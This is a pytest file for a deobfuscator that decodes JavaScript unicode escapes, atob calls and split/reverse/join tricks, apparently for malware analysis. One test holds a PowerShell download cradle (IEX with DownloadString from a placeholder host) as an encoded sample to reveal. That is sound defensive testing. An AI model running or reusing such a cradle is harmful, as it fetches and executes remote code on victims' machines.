"""
JavaScript decoder / structural pass tests.

Covers three transformations added in R1 v2.1:

* ``decoder-js-unicode-escape``
* ``decoder-js-atob``
* ``structural-js-split-reverse-join`` / ``structural-js-split-join``

Every test asserts the transformation fires (or explicitly does not
fire) and that convergence is deterministic across two runs.
"""
from __future__ import annotations

import base64

import pytest

from workspace.convergence import Artifact, converge


def _run(text: str):
    return converge(Artifact.from_input(text))


# --- decoder-js-unicode-escape -----------------------------------------------


def test_js_unicode_escape_folds_pure_unicode_string():
    escapes = "".join(f"\\u{ord(c):04x}" for c in "hello world")
    r = _run(f"var s = '{escapes}';")
    assert r.canonical
    assert "hello world" in r.final_artifact.content


def test_js_unicode_escape_leaves_mixed_strings_alone():
    """A string that mixes unicode escapes with plain chars must NOT be
    touched \u2014 the regex requires the entire literal to be pure
    ``\\uXXXX`` escapes to preserve determinism."""
    text = "var s = '\\u0068\\u0065hello';"
    r = _run(text)
    assert r.final_artifact.content == text


def test_js_unicode_escape_reveals_powershell_cradle():
    payload = "IEX ((New-Object Net.WebClient).DownloadString('http://x.example/a'))"
    escapes = "".join(f"\\u{ord(c):04x}" for c in payload).replace("'", "\\u0027")
    r = _run(f"var x = '{escapes}';")
    assert r.canonical
    out = r.final_artifact.content
    assert "IEX" in out
    assert "http://x.example/a" in out


# --- decoder-js-atob ---------------------------------------------------------


def test_js_atob_folds_single_call():
    b64 = base64.b64encode(b"Hello, world!").decode("ascii")
    r = _run(f"var x = atob('{b64}');")
    assert r.canonical
    assert "Hello, world!" in r.final_artifact.content


def test_js_atob_folds_double_quoted_form():
    b64 = base64.b64encode(b"double-quoted-atob").decode("ascii")
    r = _run(f'var y = atob("{b64}");')
    assert r.canonical
    assert "double-quoted-atob" in r.final_artifact.content


def test_js_atob_folds_nested_chain():
    inner = base64.b64encode(b"nested payload").decode("ascii")
    outer = base64.b64encode(inner.encode("ascii")).decode("ascii")
    r = _run(f"var z = atob(atob('{outer}'));")
    assert r.canonical
    assert "nested payload" in r.final_artifact.content


def test_js_atob_ignores_non_base64_argument():
    r = _run("var y = atob('this is not base64');")
    # Not a mod-4 length \u2192 no fire. Artifact must be unchanged.
    assert r.final_artifact.content == "var y = atob('this is not base64');"


# --- structural-js-split-reverse-join ---------------------------------------


def test_js_split_reverse_join_reverses_string():
    r = _run("var s = 'olleh'.split('').reverse().join('');")
    assert r.canonical
    assert "'hello'" in r.final_artifact.content


def test_js_split_reverse_join_with_delimiter():
    r = _run("var s = 'a|b|c|d'.split('|').reverse().join('-');")
    assert r.canonical
    assert "'d-c-b-a'" in r.final_artifact.content


# --- structural-js-split-join -----------------------------------------------


def test_js_split_join_replaces_delimiter():
    r = _run("var s = 'aXbXcXd'.split('X').join('-');")
    assert r.canonical
    assert "'a-b-c-d'" in r.final_artifact.content


def test_js_split_join_ignores_no_op():
    """split('X').join('X') where 'X' is not in the input is a no-op;
    the transformation should not fire (spurious fire would inflate
    the change counter)."""
    text = "var s = 'abcd'.split('X').join('Y');"
    r = _run(text)
    assert r.final_artifact.content == text


# --- Determinism --------------------------------------------------------------


@pytest.mark.parametrize(
    "text",
    [
        "var a = atob('SGVsbG8=');",
        "var b = 'olleh'.split('').reverse().join('');",
        "var c = '\\u0068\\u0069\\u0021\\u0021';",
    ],
)
def test_js_decoders_deterministic_across_runs(text):
    r1 = _run(text)
    r2 = _run(text)
    assert r1.final_artifact.content == r2.final_artifact.content
    assert r1.certificate.fingerprint == r2.certificate.fingerprint
